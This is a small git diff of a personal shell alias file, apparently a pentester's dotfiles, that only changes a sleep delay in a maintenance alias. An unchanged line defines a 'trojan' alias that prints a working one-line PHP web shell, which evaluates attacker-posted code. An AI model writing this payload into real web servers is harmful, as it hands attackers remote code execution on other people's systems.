@@ -27,7 +27,7 @@ alias pwn="code ~/pwn"
 alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
 alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"
 # shortcuts
-alias maintain="cd ~/maintain && clash && pon && sleep 0.1 && git pull && ka clash && poff && exec zsh"
+alias maintain="cd ~/maintain && clash && pon && sleep 0.3 && git pull && ka clash && poff && exec zsh"
 alias pmod="sudo chmod a+x *" # power mod
 alias ggg="gaa && gcmsg '..' && gp"
 alias gitback="git reset . && git checkout . && git clean -df" # git back (to origin)
